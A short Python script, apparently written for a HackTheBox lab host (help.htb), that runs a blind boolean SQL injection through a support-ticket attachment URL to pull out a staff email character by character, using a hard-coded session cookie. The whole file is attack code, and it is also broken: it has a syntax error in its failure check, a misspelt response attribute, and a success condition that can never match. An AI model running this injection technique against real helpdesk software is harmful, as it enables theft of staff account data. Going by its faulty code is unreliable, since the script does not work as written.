import requests
import string
import sys
import os
#clear = lambda: sys.stdout.flush()

charset = string.ascii_lowercase + string.digits
charset += "@_."
fail = 'Page not found'
success = ''
headers={
    'Cookie':'PHPSESSID=2l6hoe5drvdtq9991ib5c8bjj4'
}
result = ''
i = 1
while True:
    prev_result = result
    for char in charset:
        url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+substr((select+email+from+staff+limit+0,1),{i},1)+%3d+'{char}'--+-"
        res = requests.get(url, headers=headers)
        if fail and in res.text:
            continue
        if success and success in res.txt:
            result += char
            i += 1
            break
        print("Must set fail or success variable")
        sys.exit(1)

    print(result)
    if prev_result == result:
        break

